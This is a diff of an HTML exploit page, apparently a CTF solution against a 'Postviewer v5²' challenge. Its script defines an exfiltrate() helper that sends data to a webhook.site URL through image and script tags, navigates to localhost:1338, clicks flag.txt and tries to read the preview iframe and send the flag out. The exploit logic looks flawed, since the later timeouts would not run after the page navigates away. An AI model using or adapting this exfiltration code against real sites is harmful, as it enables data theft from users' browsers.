@@ -2,52 +2,84 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Postviewer v5² Improved Exploit</title>
+  <title>Postviewer v5² Working Exploit</title>
 </head>
 <body>
-  <h1>Improved SafeFrame Exploit</h1>
-  <p>Check your webhook for flag</p>
+  <h1>Working v5² Exploit</h1>
+  <p>Check webhook for flag</p>
 
   <script>
     const WEBHOOK = 'https://webhook.site/eb547890-9955-4e02-a8ae-3083dba7c032';
 
-    async function exploit() {
-      console.log('[+] Starting improved exploit...');
+    async function exfiltrate(data) {
+      const payload = typeof data === 'string' ? data : JSON.stringify(data);
       
-      // Step 1: Navigate to localhost:1338 directly
+      // Multiple exfiltration methods
+      const img = new Image();
+      img.src = `${WEBHOOK}?data=${encodeURIComponent(payload)}`;
+      document.body.appendChild(img);
+      
+      const script = document.createElement('script');
+      script.src = `${WEBHOOK}?callback=x&data=${encodeURIComponent(payload)}`;
+      document.head.appendChild(script);
+    }
+
+    async function exploit() {
+      await exfiltrate({
+        status: 'exploit_started',
+        timestamp: new Date().toISOString()
+      });
+
+      // Navigate to localhost:1338 where the flag exists
       setTimeout(() => {
         window.location.href = 'http://localhost:1338';
       }, 1000);
 
-      // Step 2: Wait for navigation, then look for flag file
+      // Wait for navigation, then extract flag
       setTimeout(async () => {
-        if (window.location.hostname === 'localhost') {
-          console.log('[+] On localhost:1338, looking for flag...');
-          
-          // Look for flag file in the files list
+        if (window.location.hostname === 'localhost' && window.location.port === '1338') {
+          await exfiltrate({
+            status: 'navigated_to_localhost',
+            url: window.location.href
+          });
+
+          // Look for flag file
           const filesList = document.querySelector('#filesList');
           if (filesList) {
-            const flagFile = Array.from(filesList.children).find(
-              el => el.dataset.name === 'flag.txt'
-            );
+            const files = Array.from(filesList.children);
+            const flagFile = files.find(el => el.dataset.name === 'flag.txt');
             
             if (flagFile) {
-              console.log('[+] Found flag file, clicking...');
+              await exfiltrate({
+                message: 'found_flag_file',
+                flag_id: flagFile.dataset.id
+              });
+
+              // Click flag file to load it
               flagFile.click();
-              
-              // Wait for SafeFrame to load, then extract
+
+              // Wait for SafeFrame to load
               setTimeout(async () => {
-                const iframe = document.querySelector('#previewIframe');
-                if (iframe) {
+                const previewIframe = document.querySelector('#previewIframe');
+                if (previewIframe) {
                   try {
-                    const content = iframe.contentDocument.body.innerText;
-                    if (content.includes('CTF{')) {
-                      const flag = content.match(/CTF\{[^}]+\}/)[0];
-                      await fetch(`${WEBHOOK}?flag=${encodeURIComponent(flag)}`);
-                      console.log('[+] Flag sent:', flag);
+                    // Try to access SafeFrame content
+                    const flagContent = previewIframe.contentDocument.body.innerText;
+                    if (flagContent && flagContent.includes('CTF{')) {
+                      await exfiltrate({
+                        flag: flagContent,
+                        method: 'direct_access'
+                      });
+                      
+                      await exfiltrate(flagContent);
+                      
+                      document.body.innerHTML = `<h1>FLAG: ${flagContent}</h1>`;
                     }
                   } catch (e) {
-                    console.log('[!] SafeFrame access blocked:', e.message);
+                    await exfiltrate({
+                      error: 'safeframe_blocked',
+                      details: e.message
+                    });
                   }
                 }
               }, 3000);
